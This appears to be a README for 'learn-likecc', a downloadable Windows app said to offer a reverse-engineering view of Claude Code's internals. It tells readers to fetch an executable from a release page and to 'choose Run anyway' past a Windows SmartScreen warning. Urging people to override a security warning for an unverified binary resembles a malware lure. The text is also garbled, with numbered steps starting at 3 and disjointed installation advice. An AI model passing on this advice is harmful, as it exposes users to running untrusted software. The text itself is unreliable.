## 📦 What this project is

learn-likecc is a local Windows app for studying how Claude Code works from the inside. It helps you explore source maps, code structure, and a runnable version of the project in a clear way.

It is built for users who want to:
- download a ready release
- open the app on Windows
- inspect code structure without setting up a full dev stack
- follow a course-style path through the project

This repo includes a large code base, a reverse-engineering view, and a guided learning flow.

## 🖥️ What you need

To run the app on Windows, use a computer with:

- Windows 10 or Windows 11
- 8 GB RAM or more
- 2 GB free disk space
- Internet access for the first download
- A mouse and keyboard

For best results:
- close other large apps before you start
- use a standard Windows user account
- keep your system updated

3. Look for a Windows file in the Assets list.
4. Download the file that matches your system.

If you see a SmartScreen prompt:

- then choose Run anyway

- Open the file again

- Run the app from the prompt

### The window opens but looks empty
- Wait a few seconds
- Resize the window
- Check your internet connection if the app loads online content
